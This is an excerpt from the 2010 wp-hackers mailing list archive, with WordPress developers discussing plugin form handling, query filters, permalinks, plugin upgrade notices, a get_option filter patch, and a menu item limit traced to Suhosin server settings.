>> Thanks for your reply, my script is for admin panel, just for administrator.
>>  Thanks!
>> 
>> 
>> http://www.vvthumb.com
>> 
>> 
>> Location:Room 807,QiLuRuanJianDaSha Qilu Software Park
>> No. 1 Shunhua Rd High-Tech Development Zone
>> Jinan, China 250101
>> Website: http://www.haulynjason.net
>> Mobile: +86 15854103759
>> 
>> 
>> Haulyn Jason
>> 
>> 
>> 
>> 
>> ________________________________
>> From: Chris Jean<gaarai at gaarai.com>
>> To: wp-hackers at lists.automattic.com
>> Sent: Thu, October 7, 2010 9:59:34 PM
>> Subject: Re: [wp-hackers] How to use formand link in plugin development?
>> 
>> In my humble opinion, you are going about solving this the wrong way around. You
>> shouldn't have the form send data directly to your script. Rather, you should
>> have a form submission handler in your code that runs inside WordPress.
>> 
>> To give you an example of this, I'd like to know if you have this form on the
>> back-end (admin form) or front-end (for a site visitor to fill out).
>> 
>> Chris Jean (AKA gaarai&   chrisbliss18)
>> Coder for http://ithemes.com/
>> http://gaarai.com/
>> @chrisjean
>> 
>> 
>> On 10/07/2010 08:31 AM, Haulyn Jason wrote:
>>   
>>> I solve it now, but hard code. Maybe there is a better way?
>>>   Thanks!
>>> 
>>>     
>>>> I am developing a plugin, I design a form, but I do not know the form action
>>>> rule. my form script is slackissspider.php, my logic is
>>>> slackissspider-action.php. They are in one folder( the plugin folder). Now I
>>>> can not find any reference to write<form action="??">, the related pathdoes not
>>>> work.
>>>> 
>>>> Any solutions or reference is very useful, Thanks very much.
>>>> 
>>>> Haulyn Jason
>>>>       
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> 
>> 
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>   
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From johnbillion+wp at gmail.com  Mon Oct 11 14:27:35 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 11 Oct 2010 15:27:35 +0100
Subject: [wp-hackers] Filters on get_posts()
In-Reply-To: <AANLkTi=js2ohz7xGqxSWNKzRaHNQd2Rko6uVAHLUJ7kY@mail.gmail.com>
References: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
	<AANLkTi=js2ohz7xGqxSWNKzRaHNQd2Rko6uVAHLUJ7kY@mail.gmail.com>
Message-ID: <AANLkTin2vw06PpJDnijUc4Vy6A8F17DqQ0OpVE-nmhJs@mail.gmail.com>

On Mon, Oct 11, 2010 at 10:45 AM, scribu <mail at scribu.net> wrote:
>
> You can just pass suppress_filters => false to get_posts().

As I stated this can lead to side effects because many plugins add
filters to 'posts_where' etc and use global conditionals (which are
irrelevant to my additional loop) to determine how to filter the
query. An example might be a plugin that filters 'posts_where' and
adds an additional clause when is_home() evaluates to true. I don't
want this clause showing up in my additional loop.

From johnbillion+wp at gmail.com  Mon Oct 11 14:30:26 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 11 Oct 2010 15:30:26 +0100
Subject: [wp-hackers] Filters on get_posts()
In-Reply-To: <D494878C-3CC6-4BF6-945D-421EA4CCCFB8@gmail.com>
References: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
	<D494878C-3CC6-4BF6-945D-421EA4CCCFB8@gmail.com>
Message-ID: <AANLkTikEk+KhKNrMDcopLC5m3DqA-bgKw2Emxkpm+Bp+@mail.gmail.com>

On Mon, Oct 11, 2010 at 1:02 PM, Casey Bisson <casey.bisson at gmail.com> wrote:
>
> John,
>
> I think your approach here is good. That is, there's no reason a filter has to be blindly activated as WP is instantiated, and the globally applied.

I've never thought about it that way actually. I always thought of
subsequently removing filters at runtime as being a bit hacky, but
you're right.

> Filters such as you describe should look at the context of the query and optionally activate themselves. Then immediately deactivate once their work is done. The parse-query and pre-get-posts actions are good places to apply filters, then simply remove_filter() as you run them.
>
> If you're running multiple loops, you can do yourself a favor by calling do_action('my_loop_name') just before calling wp_query(), as that will give you an opportunity to set whatever filters you want based on that specific loop/query.
>
> --Casey

I'll try this approach and see how I get on. Cheers.

From johnbillion+wp at gmail.com  Mon Oct 11 14:33:35 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 11 Oct 2010 15:33:35 +0100
Subject: [wp-hackers] Filters on get_posts()
In-Reply-To: <B3CD5895-2031-4082-8FF5-0DCC5ED88085@newclarity.net>
References: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
	<B3CD5895-2031-4082-8FF5-0DCC5ED88085@newclarity.net>
Message-ID: <AANLkTikKMakpdr+fw0FNhqtdCBSQarBpRWDQtq0YC9NA@mail.gmail.com>

On Mon, Oct 11, 2010 at 6:30 AM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> John,
>
> I have run into pretty much the same issues. ?That's why I wrote this ticket:
>
> http://core.trac.wordpress.org/ticket/15063
>
> The solution proposed in ticket may or may not be good but the problem it was trying to address is real.
>
> -Mike

The natural extension to that is to add context to hooks and filters
too. I believe this has been discussed before, and is long overdue
IMO.

From mail at scribu.net  Mon Oct 11 14:50:25 2010
From: mail at scribu.net (scribu)
Date: Mon, 11 Oct 2010 17:50:25 +0300
Subject: [wp-hackers] Filters on get_posts()
In-Reply-To: <AANLkTin2vw06PpJDnijUc4Vy6A8F17DqQ0OpVE-nmhJs@mail.gmail.com>
References: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
	<AANLkTi=js2ohz7xGqxSWNKzRaHNQd2Rko6uVAHLUJ7kY@mail.gmail.com>
	<AANLkTin2vw06PpJDnijUc4Vy6A8F17DqQ0OpVE-nmhJs@mail.gmail.com>
Message-ID: <AANLkTi=L7gzeVcfoyjO7B3xoO3JFABBwiMMjmwWnSmYt@mail.gmail.com>

On Mon, Oct 11, 2010 at 5:27 PM, John Blackbourn
<johnbillion+wp at gmail.com<johnbillion%2Bwp at gmail.com>
> wrote:

> On Mon, Oct 11, 2010 at 10:45 AM, scribu <mail at scribu.net> wrote:
> >
> > You can just pass suppress_filters => false to get_posts().
>
> As I stated this can lead to side effects because many plugins add
> filters to 'posts_where' etc and use global conditionals (which are
> irrelevant to my additional loop) to determine how to filter the
> query. An example might be a plugin that filters 'posts_where' and
> adds an additional clause when is_home() evaluates to true. I don't
> want this clause showing up in my additional loop.
>

Context is already provided: the wp_query object itself. This was only
introduced in WP 2.9 so most plugins still have to catch up.

get_posts() also sets 'caller_get_posts' => true, so plugins can use that.
In WP 3.1 'caller_get_posts' was then renamed to 'ignore_stickies':

http://core.trac.wordpress.org/ticket/14624

We should probably un-deprecate 'caller_get_posts'.

From gaarai at gaarai.com  Mon Oct 11 17:10:54 2010
From: gaarai at gaarai.com (Chris Jean)
Date: Mon, 11 Oct 2010 12:10:54 -0500
Subject: [wp-hackers] How to use formand link in plugin development?
In-Reply-To: <D3E468A2-978B-4CF0-953B-58C2F1A469D0@riskiii.com>
References: <OF2E775AB5.350F904A-ONC12577B5.003147AB-C12577B5.00318DB8@notes.edfgdf.fr>	<324027.23356.qm@web120210.mail.ne1.yahoo.com>	<181895.41125.qm@web120212.mail.ne1.yahoo.com>	<4CADD246.7050307@gaarai.com>	<367138.73819.qm@web120220.mail.ne1.yahoo.com>	<4CB3158A.3090903@gaarai.com>
	<D3E468A2-978B-4CF0-953B-58C2F1A469D0@riskiii.com>
Message-ID: <4CB3451E.6010204@gaarai.com>

No problem Danny. I'd love to hear what else would be useful in the 
plugin. I'd really like it to develop into an always-current source of 
best-practices with WP code.

The problem with documentation is that it always gets stale. Blog posts 
also have this same problem. You find a post that does exactly what you 
want, but it's three years old and irrelevant now. I figured the best 
way to keep a set of examples fresh is to make it a plugin that has to 
stay current to actually work.

Chris Jean (AKA gaarai&  chrisbliss18)
Coder for http://ithemes.com/
http://gaarai.com/
@chrisjean


On 10/11/2010 09:23 AM, Danny G Smith wrote:
> I am not the original poster, but I would like to thank you for this code.  It is very nicely written and documented, and will be great for things I need to do soon.  Thanks, Chris!
>
> thanks,
> Danny

From mikeschinkel at newclarity.net  Mon Oct 11 17:58:43 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 11 Oct 2010 13:58:43 -0400
Subject: [wp-hackers] Filters on get_posts()
In-Reply-To: <AANLkTikKMakpdr+fw0FNhqtdCBSQarBpRWDQtq0YC9NA@mail.gmail.com>
References: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
	<B3CD5895-2031-4082-8FF5-0DCC5ED88085@newclarity.net>
	<AANLkTikKMakpdr+fw0FNhqtdCBSQarBpRWDQtq0YC9NA@mail.gmail.com>
Message-ID: <94F2092D-362B-407F-8A4D-0DA52DF54D7A@newclarity.net>

On Oct 11, 2010, at 10:33 AM, John Blackbourn wrote:
> The natural extension to that is to add context to hooks and filters
> too. I believe this has been discussed before, and is long overdue

+1.   Adding context into the system would be hugely beneficial for managing the complexities that Custom Post Types have made possible.

-Mike

From mikeschinkel at newclarity.net  Mon Oct 11 18:03:43 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 11 Oct 2010 14:03:43 -0400
Subject: [wp-hackers] Filters on get_posts()
In-Reply-To: <AANLkTi=L7gzeVcfoyjO7B3xoO3JFABBwiMMjmwWnSmYt@mail.gmail.com>
References: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
	<AANLkTi=js2ohz7xGqxSWNKzRaHNQd2Rko6uVAHLUJ7kY@mail.gmail.com>
	<AANLkTin2vw06PpJDnijUc4Vy6A8F17DqQ0OpVE-nmhJs@mail.gmail.com>
	<AANLkTi=L7gzeVcfoyjO7B3xoO3JFABBwiMMjmwWnSmYt@mail.gmail.com>
Message-ID: <9A8BFAFA-6B86-4FC6-BF1E-E460CF318FA9@newclarity.net>

On Oct 11, 2010, at 10:50 AM, scribu wrote:
> Context is already provided: the wp_query object itself. This was only
> introduced in WP 2.9 so most plugins still have to catch up.

Not enough.   

A binary property like 'caller_get_posts'  cannot capture the infinite number of potential contexts in which WP_Query could be called.  We need something more.

-Mike


From mail at scribu.net  Mon Oct 11 18:36:11 2010
From: mail at scribu.net (scribu)
Date: Mon, 11 Oct 2010 21:36:11 +0300
Subject: [wp-hackers] Filters on get_posts()
In-Reply-To: <9A8BFAFA-6B86-4FC6-BF1E-E460CF318FA9@newclarity.net>
References: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
	<AANLkTi=js2ohz7xGqxSWNKzRaHNQd2Rko6uVAHLUJ7kY@mail.gmail.com>
	<AANLkTin2vw06PpJDnijUc4Vy6A8F17DqQ0OpVE-nmhJs@mail.gmail.com>
	<AANLkTi=L7gzeVcfoyjO7B3xoO3JFABBwiMMjmwWnSmYt@mail.gmail.com>
	<9A8BFAFA-6B86-4FC6-BF1E-E460CF318FA9@newclarity.net>
Message-ID: <AANLkTinETTQ6bzbOKjM_w9dyZH0krbQOjhgrHGGUstN-@mail.gmail.com>

On Mon, Oct 11, 2010 at 9:03 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> On Oct 11, 2010, at 10:50 AM, scribu wrote:
> > Context is already provided: the wp_query object itself. This was only
> > introduced in WP 2.9 so most plugins still have to catch up.
>
>  A binary property like 'caller_get_posts'  cannot capture the infinite
> number of potential contexts in which WP_Query could be called.  We need
> something more.
>

Ok, and how would that "something more" look like? Something that couldn't
already be captured in WP_Query.

From mikeschinkel at newclarity.net  Mon Oct 11 18:41:29 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 11 Oct 2010 14:41:29 -0400
Subject: [wp-hackers] Filters on get_posts()
In-Reply-To: <AANLkTinETTQ6bzbOKjM_w9dyZH0krbQOjhgrHGGUstN-@mail.gmail.com>
References: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
	<AANLkTi=js2ohz7xGqxSWNKzRaHNQd2Rko6uVAHLUJ7kY@mail.gmail.com>
	<AANLkTin2vw06PpJDnijUc4Vy6A8F17DqQ0OpVE-nmhJs@mail.gmail.com>
	<AANLkTi=L7gzeVcfoyjO7B3xoO3JFABBwiMMjmwWnSmYt@mail.gmail.com>
	<9A8BFAFA-6B86-4FC6-BF1E-E460CF318FA9@newclarity.net>
	<AANLkTinETTQ6bzbOKjM_w9dyZH0krbQOjhgrHGGUstN-@mail.gmail.com>
Message-ID: <0C0E5328-35A5-4E17-9972-94ABCF2BD98A@newclarity.net>

On Oct 11, 2010, at 2:36 PM, scribu wrote:
> 
> Ok, and how would that "something more" look like? Something that couldn't
> already be captured in WP_Query.

Here is one potential that I referenced in my email to John:

http://core.trac.wordpress.org/ticket/15063

It's a starting point for which we'd need core to leverage and as a best practice for plugin developers, to really be useful.  

-Mike



From unsalkorkmaz at gmail.com  Tue Oct 12 02:50:59 2010
From: unsalkorkmaz at gmail.com (unsalkorkmaz)
Date: Mon, 11 Oct 2010 19:50:59 -0700 (PDT)
Subject: [wp-hackers] Permalink Structure
Message-ID: <92df88de-49ce-4c38-85a7-b9d8c3d6351e@j25g2000yqa.googlegroups.com>

Hi,
Is there any performance difference with those permalink structures?
/%post_id%_%postname%.html
/%postname%_%post_id%.html

if there is difference, which one you prefer for performance and why?
Thanks a lot for help

From batmoo at gmail.com  Tue Oct 12 03:03:16 2010
From: batmoo at gmail.com (Mohammad Jangda)
Date: Mon, 11 Oct 2010 23:03:16 -0400
Subject: [wp-hackers] Permalink Structure
In-Reply-To: <92df88de-49ce-4c38-85a7-b9d8c3d6351e@j25g2000yqa.googlegroups.com>
References: <92df88de-49ce-4c38-85a7-b9d8c3d6351e@j25g2000yqa.googlegroups.com>
Message-ID: <AANLkTimojU52LuUMKkziFaSxBx2eZK7gF_sj40QvfQNg@mail.gmail.com>

On Mon, Oct 11, 2010 at 10:50 PM, unsalkorkmaz <unsalkorkmaz at gmail.com>wrote:

> Is there any performance difference with those permalink structures?
> /%post_id%_%postname%.html
> /%postname%_%post_id%.html
>
> if there is difference, which one you prefer for performance and why?
> Thanks a lot for help
>

http://ottopress.com/2010/category-in-permalinks-considered-harmful/

From elfin at elfden.co.uk  Tue Oct 12 15:04:52 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Tue, 12 Oct 2010 16:04:52 +0100
Subject: [wp-hackers] notice before plugin upgrade
Message-ID: <4CB47914.5090905@elfden.co.uk>

I realise this is only suitable for automatic upgrades but is there 
any method that I can hook into the upgrade routine for plugins with a 
custom message prior to the automatic download/upgrade?

I need to make changes to a core file of my plugin and want everyone 
to have the chance to _not_ upgrade to it. I intend doing this in a 
few versions time, so want to put the code in place _now_ to try and 
catch as many people as possible.

Obviously I can't do anything for anyone manually upgrading.

Thoughts and ideas welcomed.

Rich

From cross at thisismyurl.com  Tue Oct 12 15:26:33 2010
From: cross at thisismyurl.com (Christopher Ross)
Date: Tue, 12 Oct 2010 12:26:33 -0300
Subject: [wp-hackers] notice before plugin upgrade
In-Reply-To: <4CB47914.5090905@elfden.co.uk>
References: <4CB47914.5090905@elfden.co.uk>
Message-ID: <859BA065-C9D0-4FE1-AC09-2C2CE9C1F098@thisismyurl.com>

That's a great idea Rich, I'd love to be able to do something similar.

On 2010-10-12, at 12:04 PM, Rich Pedley wrote:

> I realise this is only suitable for automatic upgrades but is there any method that I can hook into the upgrade routine for plugins with a custom message prior to the automatic download/upgrade?
> 
> I need to make changes to a core file of my plugin and want everyone to have the chance to _not_ upgrade to it. I intend doing this in a few versions time, so want to put the code in place _now_ to try and catch as many people as possible.
> 
> Obviously I can't do anything for anyone manually upgrading.
> 
> Thoughts and ideas welcomed.
> 
> Rich
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


__

Christopher Ross

Toronto      1 (416) 840-5828
Fredericton 1 (506) 474-2708
New Orleans 1 (504) 322 3485

http://christopherross.ca
http://www.thisismyurl.com


From peter at avirtualhome.com  Tue Oct 12 16:02:10 2010
From: peter at avirtualhome.com (Peter van der Does)
Date: Tue, 12 Oct 2010 12:02:10 -0400
Subject: [wp-hackers] notice before plugin upgrade
In-Reply-To: <4CB47914.5090905@elfden.co.uk>
References: <4CB47914.5090905@elfden.co.uk>
Message-ID: <20101012120210.33366b1e@montecarlo.grandprix.int>

On Tue, 12 Oct 2010 16:04:52 +0100
Rich Pedley <elfin at elfden.co.uk> wrote:

> I realise this is only suitable for automatic upgrades but is there
> any method that I can hook into the upgrade routine for plugins with
> a custom message prior to the automatic download/upgrade?
> 
> I need to make changes to a core file of my plugin and want everyone
> to have the chance to _not_ upgrade to it. I intend doing this in a
> few versions time, so want to put the code in place _now_ to try and
> catch as many people as possible.
> 
> Obviously I can't do anything for anyone manually upgrading.
> 
> Thoughts and ideas welcomed.
> 
> Rich
You could use the action-hook in_plugin_update_message-{$file}

Have a look at my plugin AVh First Defense Against Spam to see what I
did.
http://plugins.trac.wordpress.org/browser/avh-first-defense-against-spam/tags/3.0/class/avh-fdas.admin.php


-- 
Peter van der Does

GPG key: E77E8E98

IRC: Ganseki on irc.freenode.net
Twitter: @petervanderdoes

WordPress Plugin Developer
Blog: http://blog.avirtualhome.com
Forums: http://forums.avirtualhome.com
Twitter: @avhsoftware

From elfin at elfden.co.uk  Tue Oct 12 16:25:31 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Tue, 12 Oct 2010 17:25:31 +0100
Subject: [wp-hackers] notice before plugin upgrade
In-Reply-To: <20101012120210.33366b1e@montecarlo.grandprix.int>
References: <4CB47914.5090905@elfden.co.uk>
	<20101012120210.33366b1e@montecarlo.grandprix.int>
Message-ID: <4CB48BFB.1000606@elfden.co.uk>

On 12/10/2010 17:02, Peter van der Does wrote:
> On Tue, 12 Oct 2010 16:04:52 +0100
> Rich Pedley<elfin at elfden.co.uk>  wrote:
>
>> I realise this is only suitable for automatic upgrades but is there
>> any method that I can hook into the upgrade routine for plugins with
>> a custom message prior to the automatic download/upgrade?
>>
>> I need to make changes to a core file of my plugin and want everyone
>> to have the chance to _not_ upgrade to it. I intend doing this in a
>> few versions time, so want to put the code in place _now_ to try and
>> catch as many people as possible.
>>
>> Obviously I can't do anything for anyone manually upgrading.

> You could use the action-hook in_plugin_update_message-{$file}
>
> Have a look at my plugin AVh First Defense Against Spam to see what I
> did.
> http://plugins.trac.wordpress.org/browser/avh-first-defense-against-spam/tags/3.0/class/avh-fdas.admin.php

that looks neat, I'll try that out thanks!

Rich

From chris at 314media.com  Thu Oct 14 00:40:03 2010
From: chris at 314media.com (Chris Carter)
Date: Wed, 13 Oct 2010 19:40:03 -0500
Subject: [wp-hackers] max number of menu items
Message-ID: <AANLkTinD=GJfh+iv4QTfpJwi6chpY-n2=7c04GDOQfmZ@mail.gmail.com>

Is therea cap on the number of menu items  - I had a client tell me they
were capped at 15 menu items...



-- 
Chris

From otto at ottodestruct.com  Thu Oct 14 02:40:12 2010
From: otto at ottodestruct.com (Otto)
Date: Wed, 13 Oct 2010 21:40:12 -0500
Subject: [wp-hackers] max number of menu items
In-Reply-To: <AANLkTinD=GJfh+iv4QTfpJwi6chpY-n2=7c04GDOQfmZ@mail.gmail.com>
References: <AANLkTinD=GJfh+iv4QTfpJwi6chpY-n2=7c04GDOQfmZ@mail.gmail.com>
Message-ID: <AANLkTimb=VemSudFzvGpe0CtHuW_Rs4rZD2dpUFyVXn=@mail.gmail.com>

There is no limit I know of, but a theme may be written such that
extra menu items may not appear past a certain amount, as there may
not be room for them.

-Otto



On Wed, Oct 13, 2010 at 7:40 PM, Chris Carter <chris at 314media.com> wrote:
> Is therea cap on the number of menu items ?- I had a client tell me they
> were capped at 15 menu items...
>
>
>
> --
> Chris
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From austin at ilfilosofo.com  Thu Oct 14 02:42:45 2010
From: austin at ilfilosofo.com (Austin Matzko)
Date: Wed, 13 Oct 2010 21:42:45 -0500
Subject: [wp-hackers] max number of menu items
In-Reply-To: <AANLkTinD=GJfh+iv4QTfpJwi6chpY-n2=7c04GDOQfmZ@mail.gmail.com>
References: <AANLkTinD=GJfh+iv4QTfpJwi6chpY-n2=7c04GDOQfmZ@mail.gmail.com>
Message-ID: <AANLkTimZixB75BEENjMSRUwadBX70g=mbjXRcvxmuNZ8@mail.gmail.com>

On Wed, Oct 13, 2010 at 7:40 PM, Chris Carter <chris at 314media.com> wrote:
> Is therea cap on the number of menu items ?- I had a client tell me they
> were capped at 15 menu items...

See this ticket: <http://core.trac.wordpress.org/ticket/14134>

Basically, your client's server security may be limiting how many menu
items can be saved.

From mccormicky at gmail.com  Fri Oct 15 10:44:48 2010
From: mccormicky at gmail.com (mccormicky)
Date: Fri, 15 Oct 2010 06:44:48 -0400
Subject: [wp-hackers] max number of menu items
In-Reply-To: <AANLkTimZixB75BEENjMSRUwadBX70g=mbjXRcvxmuNZ8@mail.gmail.com>
References: <AANLkTinD=GJfh+iv4QTfpJwi6chpY-n2=7c04GDOQfmZ@mail.gmail.com>
	<AANLkTimZixB75BEENjMSRUwadBX70g=mbjXRcvxmuNZ8@mail.gmail.com>
Message-ID: <AANLkTikJxcu0ej_ZCpY3DzbXgZrPh-jXOsW+jPnuk5cJ@mail.gmail.com>

I have 38 items on one menu and lost half a couple of times after saving the
menu before I realized it wasn't a problem with my menu.
Luckily Chris Carter made this thread about it or I would have been totally
unaware it was even an issue.
So,default  suhosin.post.max_vars 200 suhosin.request.max_vars  200 seems to
hold 16-20  menu items,tops.
Getting your host server admin to  raise the value of a setting is sometimes
not possible. Especially on shared.
Loading a local php.ini with raised levels suhosin.post.max_vars 5000
suhosin.request.max_vars  5000
completely knocked out suhosin - it doesn't show up in phpinfo anymore.
Yikes?








On Wed, Oct 13, 2010 at 10:42 PM, Austin Matzko <austin at ilfilosofo.com>
wrote:
>
> On Wed, Oct 13, 2010 at 7:40 PM, Chris Carter <chris at 314media.com> wrote:
> > Is therea cap on the number of menu items  - I had a client tell me they
> > were capped at 15 menu items...
>
> See this ticket: <http://core.trac.wordpress.org/ticket/14134>
>
> Basically, your client's server security may be limiting how many menu
> items can be saved.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From patrick_laverty at brown.edu  Fri Oct 15 13:56:49 2010
From: patrick_laverty at brown.edu (Patrick Laverty)
Date: Fri, 15 Oct 2010 09:56:49 -0400
Subject: [wp-hackers] I'm Selling an Extra Ticket to WCNYC
Message-ID: <AANLkTinJ5TZ=+-9ruUrKocLcLqCBDWux4GjndPAzWV2s@mail.gmail.com>

If you want to go to Word Camp NYC this weekend and don't have a
ticket yet, I'll sell you mine for $20, ($10 off).  I can't attend and
don't want it to go to waste.  I have to do this quickly, as they'll
be printing out the badges today.

Thanks!

Patrick

From leogermani at gmail.com  Fri Oct 15 14:27:36 2010
From: leogermani at gmail.com (Leo germani)
Date: Fri, 15 Oct 2010 11:27:36 -0300
Subject: [wp-hackers] new filter hook in get_option()
Message-ID: <AANLkTim2oyxCcquXwXSo4ds7aqz4cv07dGL6jrQsO5-B@mail.gmail.com>

Hi all,

Ive submited a patch to create a new filter hook in get_option() function.

I think its very useful and completely harmless, so I would like to ask if
you guys can have a look and share opinions here.

the description:
Current filter 'pre_option_$option' does not pass the option name as a
parameter, so you need to have one specific function for each option you
want to filter. This does not allow you to filter dynamically created
options, nor lets you filter all options if you want to do so.
My patch creates a new filter called 'get_option' which passes the
parameters 'option_name' and the 'default_value', so you can have one filter
to filter many options.

http://core.trac.wordpress.org/ticket/15054

Leo,,

-- 
leogermani.pirex.com.br
leogermani.estudiolivre.org

From peter.westwood at ftwr.co.uk  Fri Oct 15 14:58:12 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri, 15 Oct 2010 15:58:12 +0100
Subject: [wp-hackers] new filter hook in get_option()
In-Reply-To: <AANLkTim2oyxCcquXwXSo4ds7aqz4cv07dGL6jrQsO5-B@mail.gmail.com>
References: <AANLkTim2oyxCcquXwXSo4ds7aqz4cv07dGL6jrQsO5-B@mail.gmail.com>
Message-ID: <4B5CB538-4796-4E60-819B-EFD3CFD33814@ftwr.co.uk>

Hi,

On 15 Oct 2010, at 15:27, Leo germani wrote:

> Ive submited a patch to create a new filter hook in get_option() function.
> 
> I think its very useful and completely harmless, so I would like to ask if
> you guys can have a look and share opinions here.
> 
> the description:
> Current filter 'pre_option_$option' does not pass the option name as a
> parameter, so you need to have one specific function for each option you
> want to filter. This does not allow you to filter dynamically created
> options, nor lets you filter all options if you want to do so.
> My patch creates a new filter called 'get_option' which passes the
> parameters 'option_name' and the 'default_value', so you can have one filter
> to filter many options.
> 

If you need context please use {{{current_filter()}}}.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From peter.westwood at ftwr.co.uk  Fri Oct 15 15:02:27 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri, 15 Oct 2010 16:02:27 +0100
Subject: [wp-hackers] new filter hook in get_option()
In-Reply-To: <4B5CB538-4796-4E60-819B-EFD3CFD33814@ftwr.co.uk>
References: <AANLkTim2oyxCcquXwXSo4ds7aqz4cv07dGL6jrQsO5-B@mail.gmail.com>
	<4B5CB538-4796-4E60-819B-EFD3CFD33814@ftwr.co.uk>
Message-ID: <968A0E14-CFDC-4BFD-9ECA-7A55BD4B792D@ftwr.co.uk>


On 15 Oct 2010, at 15:58, Peter Westwood wrote:

> Hi,
> 
> On 15 Oct 2010, at 15:27, Leo germani wrote:
> 
>> Ive submited a patch to create a new filter hook in get_option() function.
>> 
>> I think its very useful and completely harmless, so I would like to ask if
>> you guys can have a look and share opinions here.
>> 
>> the description:
>> Current filter 'pre_option_$option' does not pass the option name as a
>> parameter, so you need to have one specific function for each option you
>> want to filter. This does not allow you to filter dynamically created
>> options, nor lets you filter all options if you want to do so.
>> My patch creates a new filter called 'get_option' which passes the
>> parameters 'option_name' and the 'default_value', so you can have one filter
>> to filter many options.
>> 
> 
> If you need context please use {{{current_filter()}}}.



Opps I hit send to quickly :-(

Basically, if you need to hook in one function to the pre_option_ filter for more than one option you can call current_filter and work out your context from that.

We don't need an extra filter run for every option call.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From hanskrentel at yahoo.de  Fri Oct 15 22:58:37 2010
From: hanskrentel at yahoo.de (hakre)
Date: Fri, 15 Oct 2010 23:58:37 +0100 (BST)
Subject: [wp-hackers] max number of menu items
In-Reply-To: <AANLkTinD=GJfh+iv4QTfpJwi6chpY-n2=7c04GDOQfmZ@mail.gmail.com>
References: <AANLkTinD=GJfh+iv4QTfpJwi6chpY-n2=7c04GDOQfmZ@mail.gmail.com>
Message-ID: <795813.87802.qm@web24108.mail.ird.yahoo.com>



> Von: Chris Carter <chris at 314media.com>
> An: wp-hackers at lists.automattic.com
> Gesendet: Donnerstag, den 14. Oktober 2010, 2:40:03 Uhr
> Betreff: [wp-hackers] max number of menu items
> 
> Is therea cap on the number of menu items  - I had a client tell me  they
> were capped at 15 menu items...

This can be a servers configuration issue. This link is very informative in that 
domain as well:

http://wordpress.stackexchange.com/questions/2838/how-to-fix-strange-500-error-after-editing-menu


This gives a pretty good impression.


-- hakre

http://hakre.wordpress.com/




From chris at 314media.com  Sat Oct 16 00:24:29 2010
From: chris at 314media.com (Chris Carter)
Date: Fri, 15 Oct 2010 19:24:29 -0500
Subject: [wp-hackers] max number of menu items
In-Reply-To: <795813.87802.qm@web24108.mail.ird.yahoo.com>
References: <AANLkTinD=GJfh+iv4QTfpJwi6chpY-n2=7c04GDOQfmZ@mail.gmail.com>
	<795813.87802.qm@web24108.mail.ird.yahoo.com>
Message-ID: <AANLkTimOHjQiOsyeN-mu6FpuFmS1hJG=yo-oanVkcZ9Q@mail.gmail.com>

definitely was a server issue .. I've updated their php.ini file and it
seems to have fixed it .. Changing this was really not a problem for a VPS,
but I can see clients w/o root access or access to their ini file having a
problem...  no big deal

Thanks everyone!

On Fri, Oct 15, 2010 at 5:58 PM, hakre <hanskrentel at yahoo.de> wrote:

>
>
> > Von: Chris Carter <chris at 314media.com>
> > An: wp-hackers at lists.automattic.com
> > Gesendet: Donnerstag, den 14. Oktober 2010, 2:40:03 Uhr
> > Betreff: [wp-hackers] max number of menu items
> >
> > Is therea cap on the number of menu items  - I had a client tell me  they
> > were capped at 15 menu items...
>
> This can be a servers configuration issue. This link is very informative in
> that
> domain as well:
>
>
> http://wordpress.stackexchange.com/questions/2838/how-to-fix-strange-500-error-after-editing-menu
>
>
> This gives a pretty good impression.
>
>
> -- hakre
>
> http://hakre.wordpress.com/
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-Chris
314media.com

From louie at louiemccoy.com  Sat Oct 16 13:19:41 2010
From: louie at louiemccoy.com (Louis McCoy)
Date: Sat, 16 Oct 2010 09:19:41 -0400
Subject: [wp-hackers] Apache/mod_rewrite and Permalinks
Message-ID: <AANLkTimhEzrFnoapoNXKOWdKyVvo5Un-uFm5ZoO4uFP_@mail.gmail.com>
